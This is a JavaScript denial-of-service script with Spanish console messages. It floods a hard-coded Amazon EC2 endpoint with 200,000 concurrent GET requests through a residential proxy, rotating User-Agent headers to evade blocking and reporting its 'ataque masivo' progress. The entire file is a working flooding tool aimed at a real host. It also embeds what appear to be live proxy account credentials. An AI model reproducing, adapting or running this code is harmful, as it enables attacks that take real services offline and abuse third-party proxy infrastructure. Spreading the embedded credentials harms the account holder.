import agents from "./config/agents.js";
import PQueue from "p-queue";
import chalk from "chalk";
import { HttpsProxyAgent } from "https-proxy-agent";
import axios from "axios";

// Geonode Proxy Configuration
const GEONODE_USERNAME = 'geonode_svsVqfLttY-type-residential';
const GEONODE_PASSWORD = '0ea5b7f5-88ad-4668-9028-14f2614d10fe';
const GEONODE_HOST = 'proxy.geonode.io';
const GEONODE_PORT = 9000;
const GEONODE_PROXY = `http://${GEONODE_USERNAME}:${GEONODE_PASSWORD}@${GEONODE_HOST}:${GEONODE_PORT}`;

const endpoint = "http://ec2-15-228-158-129.sa-east-1.compute.amazonaws.com/gonzo";
const totalRequests = 200000;
const timeoutMs = 20000;
const concurrency = 1000;

const stats = {
  success: 0,
  failed: 0,
  timeouts: 0,
  errors: 0,
  startedAt: Date.now(),
  updateCount: 0,
};

const queue = new PQueue({
  concurrency,
  timeout: timeoutMs * 1.5,
  throwOnTimeout: false,
});

function showStats() {
  stats.updateCount++;
  const elapsed = Math.floor((Date.now() - stats.startedAt) / 1000);
  const totalRequestsMade = stats.success + stats.failed;
  const rate = elapsed > 0 ? Math.floor(totalRequestsMade / elapsed) : 0;
  const successRate =
    totalRequestsMade > 0
      ? ((stats.success / totalRequestsMade) * 100).toFixed(1)
      : "0.0";
  
  console.clear();
  console.log(chalk.bold("🔥 Ataque en Progreso 🔥"));
  console.log(chalk.green(`✅ Éxitos: ${stats.success}`));
  console.log(chalk.red(`❌ Fallos: ${stats.failed}`));
  console.log(chalk.yellow(`⏱ Timeouts: ${stats.timeouts}`));
  console.log(chalk.blue(`⚠️ Errores: ${stats.errors}`));
  console.log(chalk.cyan(`📈 Tasa de éxito: ${successRate}%`));
  console.log(chalk.magenta(`🚀 Velocidad: ${rate} req/seg`));
  console.log(chalk.white(`⏳ Tiempo: ${elapsed} segundos`));
  console.log(chalk.gray(`🌐 Proxy fijo: ${GEONODE_HOST}`));
  console.log(chalk.gray("Presiona Ctrl+C para detener..."));
}

async function testWithProxy(attempt, signal) {
  try {
    const agent = new HttpsProxyAgent(GEONODE_PROXY);
    agent.options.rejectUnauthorized = false;

    const response = await axios.get(endpoint, {
      proxy: {
        host: GEONODE_HOST,
        port: GEONODE_PORT,
        auth: {
          username: GEONODE_USERNAME,
          password: GEONODE_PASSWORD,
        },
      },
      signal,
      timeout: timeoutMs,
      headers: {
        "User-Agent": agents[Math.floor(Math.random() * agents.length)],
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        Pragma: "no-cache",
      },
    });

    stats.success++;
    if (attempt % 100 === 0) {
      console.log(
        chalk.green(
          `[${attempt}] Éxito via ${GEONODE_HOST} - Status: ${response.status}`
        )
      );
    }
    return true;
  } catch (err) {
    if (err.name === "CanceledError") return;
    
    stats.failed++;
    if (err.code === "ECONNABORTED" || err.name === "TimeoutError") {
      stats.timeouts++;
      if (attempt % 50 === 0) {
        console.log(chalk.yellow(`[${attempt}] Timeout via ${GEONODE_HOST}`));
      }
    } else {
      stats.errors++;
      if (attempt % 50 === 0) {
        console.log(
          chalk.red(`[${attempt}] Error via ${GEONODE_HOST} - ${err.message}`)
        );
      }
    }
    return false;
  }
}

async function main() {
  console.log(chalk.bold(`🚀 Iniciando ataque masivo a ${endpoint}`));
  console.log(chalk.cyan(`📊 Total de solicitudes: ${totalRequests}`));
  console.log(chalk.cyan(`⚡ Solicitudes concurrentes: ${concurrency}`));
  console.log(chalk.cyan(`⏱ Timeout por solicitud: ${timeoutMs}ms`));
  console.log(chalk.cyan(`🌐 Proxy fijo: ${GEONODE_HOST}`));
  console.log(chalk.cyan(`🔄 User-Agents: ${agents.length} diferentes`));
  
  const statsInterval = setInterval(showStats, 1000);
  const controller = new AbortController();

  try {
    let completed = 0;
    for (let i = 0; i < totalRequests; i++) {
      queue
        .add(() => testWithProxy(i + 1, controller.signal))
        .finally(() => {
          if (++completed >= totalRequests) clearInterval(statsInterval);
        });
    }
    await queue.onIdle();
  } catch (error) {
    controller.abort();
    console.error(chalk.red(`Error principal: ${error.message}`));
  } finally {
    clearInterval(statsInterval);
    showStats();
    console.log(chalk.bold("\n🏁 Ataque completado"));
    
    const elapsed = Math.floor((Date.now() - stats.startedAt) / 1000);
    const successRate = ((stats.success / totalRequests) * 100).toFixed(1);
    
    console.log(chalk.bold("\n📊 RESUMEN FINAL"));
    console.log(chalk.cyan(`⌛ Duración total: ${elapsed} segundos`));
    console.log(
      chalk.green(`✅ Solicitudes exitosas: ${stats.success} (${successRate}%)`)
    );
    console.log(chalk.red(`❌ Solicitudes fallidas: ${stats.failed}`));
    console.log(chalk.yellow(`⏱ Timeouts: ${stats.timeouts}`));
    console.log(chalk.blue(`⚠️ Otros errores: ${stats.errors}`));
  }
}

main();